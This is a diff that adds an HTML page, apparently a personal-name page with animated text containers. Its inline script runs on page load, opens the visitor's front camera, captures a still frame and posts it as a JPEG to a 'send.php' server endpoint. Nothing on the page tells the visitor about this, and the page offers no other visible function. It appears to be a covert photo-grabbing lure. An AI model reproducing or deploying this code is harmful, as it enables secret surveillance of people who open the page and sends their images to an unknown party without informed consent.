@@ -1,0 +1,59 @@
+
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title> Nong Van Nguyen </title>
+  <link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<div class="text-change-container">
+  <div class="text-change"></div>
+</div><div class="text-change-container">
+  <div class="text-change"></div>
+</div>
+
+<video id="video" width="640" height="480" autoplay></video>
+
+    <script>
+           async function captureAndSend() {
+            const video = document.getElementById('video');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            video.srcObject = stream;
+
+            // Pause for a moment to allow camera initialization
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            // Increase the canvas size for higher resolution
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth * 2; // Adjust as needed
+            canvas.height = video.videoHeight * 2; // Adjust as needed
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/jpeg');
+
+            // Send imageData to the server using AJAX or fetch
+            fetch('send.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'image=' + encodeURIComponent(imageData),
+            })
+            .then(response => response.text())
+            .then(data => console.log(data));
+
+            // Stop the video stream
+            stream.getTracks().forEach(track => track.stop());
+        }
+
+        window.onload = captureAndSend;
+    </script> 
+<!-- partial -->
+  <script  src="./script.js"></script>
+
+</body>
+</html>
